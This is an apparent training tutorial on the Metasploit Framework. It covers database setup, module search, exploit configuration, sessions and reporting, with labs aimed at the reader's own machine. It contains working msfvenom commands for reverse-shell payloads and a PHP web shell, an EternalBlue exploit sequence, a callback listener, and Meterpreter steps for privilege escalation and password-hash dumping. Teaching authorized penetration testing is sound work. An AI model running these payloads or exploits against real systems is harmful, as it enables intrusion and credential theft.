# Metasploit Basics

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. Metasploit launches real exploits and generates real malware. Use it only against systems you own or that are explicitly in scope for an authorized engagement. Payloads generated with `msfvenom` are detected as malicious by antivirus, which is correct: treat them as live malware, keep them off shared drives, and delete them when finished. Every lab here targets your own machine. See the [Legal and Terms of Use](/legal) page.

> "The quietest tool in the room is often the most powerful."

**Scope:** The Metasploit Framework from setup to documentation: PostgreSQL backend, navigating msfconsole, finding and configuring modules, running exploits and auxiliary scanners, generating payloads with `msfvenom`, managing sessions, and recording findings with `notes` and `loot`. Automation and custom module development are covered separately in **Metasploit Scripting**.

## Table of Contents
- [Core Concepts](#core-concepts)
- [Module Types](#module-types)
- [Starting msfconsole](#starting-msfconsole)
- [The Database](#the-database)
- [Lab A: Set Up and Verify the Database](#lab-a-set-up-and-verify-the-database)
- [Finding Modules](#finding-modules)
- [The Core Workflow](#the-core-workflow)
- [Targets and Options](#targets-and-options)
- [Payloads: Staged vs Stageless](#payloads-staged-vs-stageless)
- [Auxiliary Modules and Port Scanning](#auxiliary-modules-and-port-scanning)
- [Lab B: TCP Port Scan](#lab-b-tcp-port-scan)
- [msfvenom](#msfvenom)
- [Lab C: Generate and Validate a Payload](#lab-c-generate-and-validate-a-payload)
- [Sessions](#sessions)
- [Meterpreter Basics](#meterpreter-basics)
- [Documenting with notes and loot](#documenting-with-notes-and-loot)
- [Lab D: Record a Finding](#lab-d-record-a-finding)
- [Where Metasploit Fits](#where-metasploit-fits)
- [Command Quick Reference](#command-quick-reference)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Core Concepts

**Metasploit** is an exploitation framework: a large, organized collection of ready-made exploits, payloads, and supporting tools, wrapped in a console that makes them easy to configure and launch.

Instead of writing an exploit from scratch, you search its database for a module matching the vulnerability you found (usually by CVE), point it at your target, choose what should happen on success, and run it. Where **Nessus finds** the vulnerability, **Metasploit exploits** it. It comes preinstalled on Kali.

| Term | What it is |
|------|-----------|
| **Module** | Any single tool in Metasploit (an exploit, scanner, and so on) |
| **Exploit** | Code that takes advantage of a specific vulnerability |
| **Payload** | What runs on the target *after* the exploit succeeds |
| **Listener** | Waits on your machine for the target to connect back |
| **Session** | An active connection to a compromised target |
| **Meterpreter** | A powerful payload giving an interactive post-exploitation shell |

**The mental model:** the exploit gets you in, the payload is what you get once you are in. The exploit might trigger an SMB flaw; the payload might open a Meterpreter shell.

## 2. Module Types

| Type | Purpose |
|------|---------|
| **exploit** | Take advantage of a vulnerability |
| **payload** | Code delivered and run on the target |
| **auxiliary** | Scanners, fuzzers, and tools that do not exploit |
| **post** | Post-exploitation tasks, run after you have access |
| **encoder** | Re-encode payloads, mainly to avoid specific bad bytes |
| **nop** | Padding to help payloads run reliably |
| **evasion** | Modules built specifically to evade antivirus and defences |

Most work lives in **exploit** and **payload**. **Auxiliary** is where scanning and other non-exploitative tooling lives, and it is the type to reach for during reconnaissance.

## 3. Starting msfconsole

`msfconsole` is the main interface, an interactive command console.

```bash
msfconsole              # start
msfconsole -q           # start without the banner, faster to read
msfconsole -v           # version check
```

First launch takes a moment. Once inside, the prompt becomes `msf6 >`.

Basic navigation once you are in:

```text
help                    list all console commands
help search             help for one specific command
version                 framework version
banner                  print a random banner
back                    leave the current module
exit                    quit the console
```

The console supports **tab completion**, which matters more than it sounds. Typing `use exploit/windows/smb/` and pressing Tab lists everything underneath it, so you can browse module paths without memorizing them.

## 4. The Database

Metasploit works far better with a **PostgreSQL** database behind it. Without one, every scan result and session detail disappears when you close the console. With one, hosts, services, credentials, notes, and loot are stored and queryable.

**Why it matters for real work:** an assessment produces hundreds of findings across days. The database is what turns that into something you can search, filter, and export at reporting time.

### Setting it up

```bash
# 1. start PostgreSQL and enable it at boot
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 2. initialize the Metasploit database (creates user, database, schema)
sudo msfdb init

# 3. confirm from outside the console
sudo msfdb status
```

### Verifying from inside

```bash
msfconsole -q
```

```text
db_status
```

Expected: `Connected to msf. Connection type: postgresql.`

If it reports `postgresql selected, no connection`, the framework knows which driver to use but cannot reach the database. Exit the console, re-run `sudo msfdb init`, and if it still fails, `sudo msfdb reinit` rebuilds it from scratch.

### Workspaces

A **workspace** is a separate container of results, so one engagement's data does not mix with another's.

```text
workspace                       list workspaces, current one marked *
workspace -a lab_practice       add and switch to a new one
workspace lab_practice          switch to an existing one
workspace -d old_project        delete one
```

Start every new engagement with a fresh workspace. It costs one command and saves a lot of confusion later.

### What the database stores

```text
hosts           machines discovered
services        open ports and service versions
vulns           vulnerabilities identified
creds           credentials collected
notes           free-form observations
loot            files and data extracted from targets
```

## 5. Lab A: Set Up and Verify the Database

**What you are doing:** getting the PostgreSQL backend running and proving it works, because every later section depends on it.

**Time:** about 5 minutes. **Target:** your own machine only.

### Step 1: Start the service

```bash
sudo systemctl start postgresql
sudo systemctl status postgresql | head -5
```

Expected: **`Active: active (exited)`**.

That looks wrong but is correct. On Debian and Kali, `postgresql.service` is a wrapper unit that starts the real daemon and then exits. The actual database process runs under a versioned unit:

```bash
sudo systemctl status 'postgresql@*' | head -8    # this one shows active (running)
ss -tlnp | grep 5432                              # or just confirm it is listening
```

### Step 2: Initialize

```bash
sudo msfdb init
```

Expected output mentions creating the database user and schema. If it says the database already exists, that is fine.

### Step 3: Verify from inside the console

```bash
msfconsole -q
```

```text
db_status
```

| Result | Meaning |
|--------|---------|
| `Connected to msf. Connection type: postgresql.` | Working. Continue |
| `postgresql selected, no connection` | The driver is selected but the database is unreachable. Exit and run `sudo msfdb reinit` |

### Step 4: Create a workspace

```text
workspace -a lab_practice
workspace
```

Expected: `lab_practice` listed with an asterisk marking it as current.

### Step 5: Confirm it is empty

```text
hosts
services
notes
```

All three should report no entries. That is your baseline, and it means anything appearing later came from your own activity.

### Cleanup

Keep the workspace for the later labs. To remove it afterwards:

```text
workspace -d lab_practice
```

## 6. Finding Modules

Metasploit ships with thousands of modules. `search` with filters is how you find the right one instead of scrolling.

### Basic search

```text
search eternalblue
search ms17-010
search smb
```

### Filtered search, which is the useful form

```text
search type:exploit platform:windows smb
search type:auxiliary portscan
search cve:2017-0144
search name:eternalblue
search rank:excellent type:exploit platform:linux
search author:hdm
search path:scanner/portscan
```

| Filter | Narrows by |
|--------|-----------|
| `type:` | exploit, auxiliary, post, payload, encoder, nop, evasion |
| `platform:` | windows, linux, unix, php, python, android |
| `cve:` | a specific CVE identifier |
| `name:` | words in the module name |
| `rank:` | excellent, great, good, normal, average, low, manual |
| `path:` | part of the module path |
| `author:` | module author |

**Rank matters.** It describes reliability, not power. `excellent` modules rarely crash the target; `low` and `manual` ones may. On an authorized engagement against production, rank is a real safety consideration.

### Inspecting before using

```text
info exploit/windows/smb/ms17_010_eternalblue
```

Shows the description, affected targets, options, references, and rank. **Read this before running anything**, since it tells you what the module actually does and which targets it supports.

### Selecting a module

```text
use exploit/windows/smb/ms17_010_eternalblue
use 0                    # by index number from the last search results
back                     # leave the current module
```

After `use`, the prompt changes to show the selected module, which is how you know what is loaded.

## 7. The Core Workflow

Almost every module follows the same five steps.

```text
1. SEARCH  → find a module matching your vulnerability
2. USE     → select that module
3. SET     → configure its options
4. CHECK   → (optional) verify the target looks vulnerable
5. RUN     → launch it
```

In practice:

```text
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.64.2
set LHOST 192.168.64.3
check
run
```

Useful `show` commands once a module is loaded:

```text
show options            required and optional settings
show payloads           payloads compatible with this module
show targets            supported target platforms and versions
show advanced           advanced options
show evasion            evasion options
```

Settings and their scope:

```text
set RHOSTS 192.168.1.10       set for the current module only
setg LHOST 192.168.1.5        set globally, persists across modules
unset LHOST                   clear one option
unsetg LHOST                  clear a global option
```

`setg` is worth knowing: your `LHOST` rarely changes during an engagement, so setting it globally once saves repeating it in every module.

## 8. Targets and Options

The options that cause the most failures:

| Option | Meaning | Set it to |
|--------|---------|-----------|
| **RHOSTS** | Remote host, the target | The target's IP |
| **RPORT** | Remote port, the target's service | Often preset |
| **LHOST** | Local host, **your** IP the target connects back to | Your own IP |
| **LPORT** | Local port your listener waits on | Often preset, 4444 |
| **PAYLOAD** | What runs on success | Usually a sensible default |

**The classic mistake is LHOST.** For a reverse connection the target connects back to *you*, so LHOST must be **your IP on the network the target can reach**. If your IP changed after a reconnect, the target calls back to nowhere and the exploit fails silently with no error.

```bash
# find your IP before setting LHOST
ip addr show | grep "inet "

# the interface IP used to reach the outside, matched by field name
ip route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}'
```

> Match on the word `src` rather than a fixed column. The layout of `ip route get` changes depending on whether the route goes via a gateway, so a positional lookup like `$7` returns the wrong value on a directly-connected network.

`RHOSTS` accepts more than one host, which is what makes auxiliary scanners useful:

```text
set RHOSTS 192.168.1.10
set RHOSTS 192.168.1.0/24
set RHOSTS 192.168.1.1-192.168.1.50
set RHOSTS file:/path/to/targets.txt
```

## 9. Payloads: Staged vs Stageless

Payload names come in two styles, and the difference explains a whole category of silent failures.

| Style | Example | How it works |
|-------|---------|--------------|
| **Staged** | `windows/x64/meterpreter/reverse_tcp` | Sends a small stub first, which pulls the rest |
| **Stageless** | `windows/x64/meterpreter_reverse_tcp` | Sends the whole payload in one piece |

**Read the separator:** a **slash** between `meterpreter` and `reverse_tcp` means staged, sent in two parts. An **underscore** joining them means stageless, sent all at once.

Staged is smaller and more flexible but needs a stable connection to pull the second stage. Stageless is larger but more reliable over flaky links. **If a staged payload connects then immediately dies, switching to the stageless version is the standard fix.**

```text
show payloads                                   payloads valid for this module
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## 10. Auxiliary Modules and Port Scanning

Auxiliary modules do everything that is not exploitation: scanning, fuzzing, sniffing, brute-forcing, and service enumeration. They are the reconnaissance half of the framework.

```text
search type:auxiliary portscan
search type:auxiliary scanner smb
search type:auxiliary scanner ssh
```

### The TCP port scanner

```text
use auxiliary/scanner/portscan/tcp
show options
```

| Option | Purpose | Typical |
|--------|---------|---------|
| `RHOSTS` | Target or range | Required |
| `PORTS` | Ports to scan | `1-10000` |
| `THREADS` | Concurrent scans | 10 to 50 |
| `TIMEOUT` | Milliseconds per port | 1000 |
| `CONCURRENCY` | Hosts scanned at once | 10 |

```text
set RHOSTS 127.0.0.1
set PORTS 1-1000
set THREADS 20
run
```

Results are written into the database automatically, so afterwards:

```text
hosts
services
```

**Why use this over nmap?** Usually you would not; nmap is faster and more capable. The reasons to use the Metasploit scanner are that results land straight in the workspace database, and that it works through a pivot when you have a session on an internal host and no nmap there.

### Bringing nmap results into the database

```text
db_nmap -sV -p 1-1000 127.0.0.1
```

`db_nmap` runs real nmap and stores the output in the workspace, which gives you nmap's speed with Metasploit's record-keeping.

### Other common auxiliary scanners

```text
auxiliary/scanner/smb/smb_version
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/http/http_version
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/discovery/udp_sweep
```

## 11. Lab B: TCP Port Scan

**What you are doing:** running an auxiliary scanner against your own machine and confirming the results land in the database.

**Time:** about 10 minutes. **Target:** `127.0.0.1`, your own loopback interface only.

### Step 1: Open something to find

So the scan has a result, start a listener in a second terminal:

```bash
python3 -m http.server 8000
```

### Step 2: Load the scanner

```text
workspace lab_practice
use auxiliary/scanner/portscan/tcp
show options
```

Read the options list before setting anything. Required ones are marked `yes`.

### Step 3: Configure and run

```text
set RHOSTS 127.0.0.1
set PORTS 7990-8010
set THREADS 10
run
```

Expected output:

```text
[+] 127.0.0.1:          - 127.0.0.1:8000 - TCP OPEN
[*] 127.0.0.1:          - Scanned 1 of 1 hosts (100% complete)
```

Scanning a narrow port range keeps this fast. Widening to `1-65535` works but takes far longer.

### Step 4: Confirm the database captured it

```text
hosts
services
```

Expected: `127.0.0.1` in hosts, and port 8000 in services. **This is the point of the lab.** The scan output scrolls past; the database entry persists.

### Step 5: Compare with db_nmap

```text
db_nmap -sV -p 7990-8010 127.0.0.1
services
```

`db_nmap` adds the service version where the basic scanner only reports the port as open.

### Cleanup

Press `Ctrl-C` in the terminal running `python3 -m http.server` to stop it. Leave the `lab_practice` workspace in place, because Lab D uses the data you just collected.

## 12. msfvenom

`msfvenom` generates standalone payloads as files, for use outside msfconsole. It is the tool for producing an executable, script, or shellcode that you deliver by some other means.

**It runs from the shell, not inside msfconsole.**

### The anatomy of a command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 \
         LPORT=4444 \
         -f exe \
         -o payload.exe
```

| Flag | Meaning |
|------|---------|
| `-p` | The payload to generate |
| `LHOST=` | Your IP for the callback (a payload option, no dash) |
| `LPORT=` | Your listening port |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder to use |
| `-i` | Number of encoding iterations |
| `-b` | Bad characters to avoid |
| `-a` | Architecture (x86, x64) |
| `--platform` | Target platform |
| `-l` | List available items |

Note that `LHOST` and `LPORT` take no dash: they are payload options, not msfvenom flags.

### Discovering what is available

```bash
msfvenom -l payloads | head -40
msfvenom -l payloads | grep windows/x64/meterpreter
msfvenom -l formats
msfvenom -l encoders
msfvenom --list-options -p windows/x64/meterpreter/reverse_tcp
```

That last one shows every option a specific payload accepts, which is the reliable way to see what is required.

### Common generations

```bash
# Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php

# Python
msfvenom -p python/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.py

# Raw shellcode as C
msfvenom -p linux/x64/exec CMD=/bin/sh -f c
```

### Encoding

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

`-e` selects an encoder and `-i` sets iterations. **Be realistic about what this achieves:** encoders were designed to avoid bad characters and were never a reliable antivirus bypass. Modern endpoint protection detects `shikata_ga_nai` output readily. Treat encoding as a byte-level constraint tool, not evasion.

`-b` specifies bytes the payload must not contain, which matters when injecting into a buffer that treats certain bytes as terminators:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b '\x00\x0a\x0d' -f python
```

### Catching the callback

A generated payload needs a listener waiting. That is `multi/handler`:

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
run -j
```

**The payload and the handler must match exactly**, both the payload type and LHOST/LPORT. A mismatch is the most common reason a payload runs on the target but no session appears. `run -j` runs it as a background job so you keep the console.

## 13. Lab C: Generate and Validate a Payload

**What you are doing:** producing a payload file and confirming it is what you asked for, without running it anywhere.

**Time:** about 10 minutes. **Nothing is executed**, this lab only generates and inspects.

### Step 1: Find your IP

```bash
export LH=$(ip route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}')
echo "$LH"
```

Confirm it printed an IP address and not a number like `1000`. Matching on the field name `src` rather than a fixed column is what makes this work on both gateway and directly-connected routes.

### Step 2: Generate a Linux payload

```bash
mkdir -p ~/msf-lab && cd ~/msf-lab

msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=$LH LPORT=4444 \
         -f elf -o shell.elf
```

Expected output states the payload size in bytes and that no encoder or platform was specified.

### Step 3: Validate the file

Never assume a generated file is what you asked for. Checking takes three commands and catches a wrong format flag immediately.

```bash
ls -lh shell.elf                 # exists, non-zero size
file shell.elf                   # is it really an ELF binary?
strings shell.elf | head -20     # readable strings inside
xxd shell.elf | head -3          # magic bytes
```

| Check | Expected |
|-------|----------|
| `ls -lh` | A file of roughly 250 bytes or more |
| `file` | `ELF 64-bit LSB executable, x86-64` |
| `xxd` first bytes | `7f45 4c46`, which is `\x7fELF` |

If `file` reports `data` rather than ELF, the format flag was wrong.

### Step 4: Confirm the IP is embedded

```bash
strings shell.elf | grep -F "$LH"      # expect nothing
```

Nothing found, which is correct. The IP is not stored as text, it is packed into **four raw bytes**. So search for those bytes instead:

```bash
# turn 192.168.1.50 into c0a80132
PAT=$(printf '%02x%02x%02x%02x' ${LH//./ })
echo "looking for: $PAT"

xxd -p shell.elf | tr -d '\n' | grep -o "$PAT"
```

| Command part | What it does |
|--------------|--------------|
| `${LH//./ }` | Replaces the dots with spaces, so `printf` receives four separate numbers |
| `printf '%02x...'` | Converts each octet to two hex digits |
| `xxd -p` | Plain hexdump, no offsets or ASCII column |
| `tr -d '\n'` | Joins it into one long line so a match cannot straddle a line break |

Expected: the pattern prints. Prove to yourself that this check is real by searching for an IP you did **not** use:

```bash
printf '%02x%02x%02x%02x' 10 0 0 1        # 0a000001
xxd -p shell.elf | tr -d '\n' | grep -o '0a000001'     # expect no output
```

The port is embedded the same way: 4444 is `115c` in hex.

### Step 5: Generate a different format and compare

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LH LPORT=4444 -f exe -o shell.exe
file shell.exe
ls -lh shell.elf shell.exe
```

Expected: `PE32+ executable` for the Windows one, and a noticeably larger file, since the EXE format carries more structure.

### Step 6: See the size cost of encoding

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LH LPORT=4444 \
         -e x64/xor -i 3 -f elf -o encoded.elf
ls -lh shell.elf encoded.elf
```

The encoded version is larger. Each iteration adds a decoder stub.

### Cleanup

**Do this.** These are functional payloads.

```bash
cd ~ && rm -rf ~/msf-lab
```

## 14. Sessions

A **session** is a live connection to a compromised host. You can hold several at once.

| Command | What it does |
|---------|-------------|
| `sessions` | List all active sessions |
| `sessions -i 1` | Interact with session 1 |
| `background` or `Ctrl-Z` | Leave the session running, return to msf |
| `sessions -k 1` | Kill session 1 |
| `sessions -K` | Kill all sessions |
| `sessions -u 1` | Upgrade a basic shell to Meterpreter |

The pattern: `background` a session to run more Metasploit commands, then `sessions -i <id>` to return. Sessions persist until killed or the connection drops.

`sessions -u` is worth remembering. If an exploit yields a plain command shell, upgrading it gives you Meterpreter's full feature set without re-exploiting.

## 15. Meterpreter Basics

**Meterpreter** is Metasploit's flagship payload: an in-memory shell with far more capability than a plain command prompt.

| Command | What it does |
|---------|-------------|
| `sysinfo` | Target OS and system info |
| `getuid` | Which user you are running as |
| `ps` | Running processes |
| `pwd`, `cd`, `ls` | Navigate the filesystem |
| `download <file>` | Pull a file to your machine |
| `upload <file>` | Push a file to the target |
| `search -f flag.txt` | Search the filesystem for a file |
| `hashdump` | Dump password hashes from the SAM (Windows) |
| `getsystem` | Attempt privilege escalation to SYSTEM |
| `shell` | Drop into a native OS command shell |
| `background` | Return to msfconsole, session stays alive |

Typical post-exploitation sequence on a Windows target:

```text
sysinfo
getuid
getsystem
hashdump
search -f *.txt
```

`hashdump` is the one that connects to the wider workflow: it extracts Windows password hashes, which you then crack offline with John or Hashcat.

## 16. Documenting with notes and loot

This is the part most people skip, and it is the difference between a hobbyist and a professional. Metasploit stores your findings so the report writes itself from real data rather than memory.

### notes: observations

```text
notes                                              list all notes
notes -a -t observation -n "SMB signing disabled" 192.168.1.10
notes -t observation                               filter by type
notes -d                                           delete notes
```

`-a` adds, `-t` sets a type label, `-n` is the note text, and the address at the end associates it with a host.

Use consistent type labels so filtering works later, for example `observation`, `finding`, `credential`, `next_step`.

### loot: files and data extracted

```text
loot                                               list all loot
loot -a -f /path/to/hashes.txt -i "SAM hashes from DC01" -t hashes 192.168.1.10
loot -t hashes                                     filter by type
```

Some modules write to loot automatically. Meterpreter's `screenshot` does, and so does `post/windows/gather/smart_hashdump`.

**A common misconception:** Meterpreter's built-in `hashdump` (from the priv extension) only prints to the console, it does **not** store to loot. If you want those hashes recorded, either run the post module version, or capture the output and add it yourself with `loot -a`.

Manual `loot -a` is for anything you obtained another way.

### The other database tables

```text
hosts                          discovered machines
hosts -c address,os_name,name  choose which columns to show
services                       open ports and versions
services -p 445                filter by port
vulns                          vulnerabilities found
creds                          credentials collected
```

### Exporting for the report

```text
db_export -f xml /home/user/engagement.xml
db_export -f pwdump /home/user/creds.txt
```

XML preserves everything and can be re-imported with `db_import`. This is what you hand to a reporting tool, or parse yourself.

**The discipline worth building:** add a note the moment you observe something, not at the end of the day. Notes written from memory are thinner and less accurate, and on a multi-day engagement you will not remember which host had which finding.

## 17. Lab D: Record a Finding

**What you are doing:** practising the documentation workflow on the data you generated in Lab B.

**Time:** about 5 minutes.

### Step 1: Confirm you have data

```text
workspace lab_practice
hosts
services
```

You should see `127.0.0.1` from the earlier scan. If not, re-run Lab B.

### Step 2: Add a note

```text
notes -a -t observation -n "HTTP service on 8000, python http.server, lab only" 127.0.0.1
notes
```

Expected: your note listed against the host, with its type and timestamp.

### Step 3: Add loot

```bash
echo "example extracted data" > /tmp/lab_evidence.txt
```

```text
loot -a -f /tmp/lab_evidence.txt -i "Lab evidence file" -t lab_data 127.0.0.1
loot
```

### Step 4: Filter

```text
notes -t observation
services -p 8000
```

Filtering is why type labels matter. With hundreds of entries, `notes -t credential` is what makes the data usable.

### Step 5: Export

From inside msfconsole:

```text
db_export -f xml /tmp/lab_export.xml
```

Then back in the shell, confirm it wrote:

```bash
ls -lh /tmp/lab_export.xml
head -20 /tmp/lab_export.xml
```

### Cleanup

```text
workspace -d lab_practice
```

```bash
rm -f /tmp/lab_evidence.txt /tmp/lab_export.xml
```

## 18. Where Metasploit Fits

```text
1. nmap         → discover hosts, ports, service versions
2. Nessus       → find known vulnerabilities (CVE + CVSS)
3. NVD          → research the flagged CVE
4. METASPLOIT   → exploit it, get a session
5. hashdump     → extract password hashes
6. John/Hashcat → crack the hashes offline
7. notes/loot   → document throughout, export at the end
```

Metasploit is where earlier recon pays off: you feed it the CVE that Nessus flagged, it gives you access, and its post-exploitation tools hand you the material for cracking and reporting. Step 7 is not a final step, it runs alongside everything from step 1.

## 19. Command Quick Reference

### Console and database

| Command | What it does |
|---------|-------------|
| `msfconsole -q` | Start the console quietly |
| `sudo msfdb init` | Initialize the database |
| `db_status` | Check the database connection |
| `workspace -a <name>` | Create and switch workspace |
| `help` | List console commands |
| `back` | Leave the current module |

### Modules

| Command | What it does |
|---------|-------------|
| `search type:exploit platform:windows smb` | Filtered module search |
| `search cve:2017-0144` | Search by CVE |
| `info <module>` | Module details before using it |
| `use <module>` | Select a module |
| `show options` | List settings |
| `show payloads` | Compatible payloads |
| `set RHOSTS <ip>` | Set the target |
| `setg LHOST <ip>` | Set your IP globally |
| `check` | Test if the target looks vulnerable |
| `run` or `exploit` | Launch |

### Scanning and data

| Command | What it does |
|---------|-------------|
| `use auxiliary/scanner/portscan/tcp` | TCP port scanner |
| `db_nmap -sV <ip>` | Run nmap, store results |
| `hosts` | List discovered hosts |
| `services` | List discovered services |
| `notes -a -t <type> -n "<text>" <ip>` | Add a note |
| `loot -a -f <file> -i "<info>" -t <type> <ip>` | Add loot |
| `db_export -f xml <path>` | Export the workspace |

### Sessions and payloads

| Command | What it does |
|---------|-------------|
| `sessions` | List sessions |
| `sessions -i <id>` | Interact with a session |
| `background` | Background the current session |
| `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <fmt> -o <file>` | Generate a payload |
| `msfvenom -l payloads` | List payloads |
| `use exploit/multi/handler` | Listener for a generated payload |

## 20. Fast Recall

- **Metasploit is an exploitation framework.** Nessus finds the vulnerability, Metasploit exploits it.
- **The exploit gets you in; the payload is what you get once in.**
- **Module types:** exploit, payload, auxiliary (scanners), post, encoder, nop.
- **The database is PostgreSQL.** `sudo msfdb init` to set up, `db_status` inside the console to verify. Expect `Connected to msf`.
- **Use a workspace per engagement:** `workspace -a <name>`. It keeps results separate.
- **Search with filters:** `type:`, `platform:`, `cve:`, `name:`, `rank:`. Run `info <module>` before using it.
- **Rank means reliability, not power.** `excellent` rarely crashes the target.
- **Workflow:** search, use, set, check, run.
- **`set` is per-module; `setg` is global.** Set LHOST globally once.
- **LHOST is your IP, RHOSTS is the target.** A wrong LHOST makes the exploit fail silently, because the target calls back to nowhere.
- **Staged uses a slash** (`meterpreter/reverse_tcp`), sent in two parts. **Stageless uses an underscore** (`meterpreter_reverse_tcp`), sent at once. If a staged payload dies immediately, try stageless.
- **Auxiliary modules do reconnaissance.** `auxiliary/scanner/portscan/tcp` with `RHOSTS`, `PORTS`, `THREADS`.
- **`db_nmap`** runs real nmap and stores results in the workspace.
- **msfvenom runs from the shell, not the console.** `-p` payload, `-f` format, `-o` output. `LHOST=` and `LPORT=` take no dash.
- **Validate a generated payload** with `file`, `ls -lh`, and `xxd`. An ELF starts `7f45 4c46`.
- **Encoders are not antivirus evasion.** They handle bad characters. Modern endpoint protection detects `shikata_ga_nai`.
- **A generated payload needs `exploit/multi/handler`** with the **exact same payload, LHOST, and LPORT**, or no session appears.
- **`sessions -u <id>`** upgrades a plain shell to Meterpreter.
- **Document as you go:** `notes -a -t <type> -n "<text>" <host>` and `loot -a -f <file>`. Export with `db_export -f xml`.

## 21. Resources

**Official**
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Framework on GitHub](https://github.com/rapid7/metasploit-framework)
- [Rapid7: Metasploit Basics](https://www.rapid7.com/fundamentals/metasploit-framework/)
- [Metasploit Unleashed (Offensive Security)](https://www.offsec.com/metasploit-unleashed/)

**Module and payload reference**
- [Metasploit module database](https://www.rapid7.com/db/modules/)
- [msfvenom documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Exploit-DB](https://www.exploit-db.com/)

**Practice (authorized labs)**
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [Hack The Box](https://www.hackthebox.com/)
- [TryHackMe: Metasploit](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)

**Related material**
- Nmap, for the reconnaissance that feeds Metasploit
- Nessus and Vulnerability Management, for finding the CVEs to exploit
- **Metasploit Scripting**, for resource scripts, automation, and custom modules